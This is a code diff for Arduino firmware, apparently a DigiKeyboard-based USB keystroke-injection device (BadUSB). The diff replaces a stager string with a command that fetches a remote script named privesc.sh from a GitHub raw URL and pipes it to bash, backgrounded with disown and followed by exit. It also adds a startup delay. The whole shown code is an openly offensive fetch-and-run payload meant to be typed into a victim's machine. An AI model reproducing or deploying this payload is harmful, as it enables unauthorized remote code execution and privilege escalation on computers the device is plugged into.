@@ -1,11 +1,14 @@
 #include <Arduino.h>
 #include "DigiKeyboard.h"
 
-const char* STAGER_PAYLOAD = "curl -sL x.co/abc | bash & disown";
+const char* STAGER_PAYLOAD = "curl -sL https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/privesc.sh | bash & disown; exit";
 
 void setup() {}
 
 void loop() {
+    // Sleep
+    DigiKeyboard.delay(10000);
+
     // Wait for OS to enumerate the USB device
     DigiKeyboard.delay(3000);
 
